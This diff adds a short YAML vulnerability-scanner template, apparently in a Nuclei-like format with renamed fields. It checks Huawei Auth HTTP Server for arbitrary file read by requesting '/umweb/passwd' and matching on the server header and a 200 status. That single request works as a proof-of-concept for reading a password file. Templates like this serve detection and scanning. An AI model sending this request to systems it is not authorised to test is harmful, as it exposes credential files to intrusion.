@@ -1,0 +1,24 @@
+id: huawei-authhttp-lfi
+brief:
+    title: Huawei Auth Http Server - Arbitrary File Read
+    by: DhiyaneshDk
+    level: high
+    about: Huawei Auth HTTP Server is vulnerable to Arbitrary File Read.
+    label:
+        - lfi
+        - huawei
+        - authhttp
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/umweb/passwd'
+      signs:
+        - "on": word
+          has:
+            - Huawei Auth-Http Server
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
